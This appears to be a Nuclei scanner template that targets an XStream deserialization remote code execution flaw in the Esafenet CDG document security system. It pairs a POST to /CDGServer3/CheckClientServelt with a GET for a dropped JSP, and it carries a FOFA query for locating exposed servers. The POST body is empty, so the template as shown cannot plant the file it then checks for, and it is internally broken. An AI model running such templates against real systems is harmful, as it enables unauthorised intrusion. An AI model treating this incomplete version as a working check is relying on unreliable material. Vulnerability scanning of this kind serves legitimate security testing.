id: esafenet-cdgserver3-CheckClientServelt-rce

info:
  name: 亿赛通电子文档安全管理系统 /CDGServer3/CheckClientServelt 接口 XStream 反序列化远程代码执行漏洞
  author: SleepingBag945
  severity: critical
  description: 亿赛通电子文档安全管理系统 CheckClientServelt 接口远程代码执行漏洞，该漏洞发生在应用程序将外部输入（如用户提交的数据）反序列化为对象或数据结构时，由于缺乏充分的输入验证和安全措施，攻击者可以利用恶意数据来执行未经授权的代码或攻击。
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: cdg,esafenet,upload,rce

http:
  - raw:
      - |
        POST /CDGServer3/CheckClientServelt HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: zh-CN,zh;q=0.9

        

      - |
        GET /CDGServer3/tdawo2aaa.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        


    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "12321"
        condition: and

      - type: status
        status:
          - 200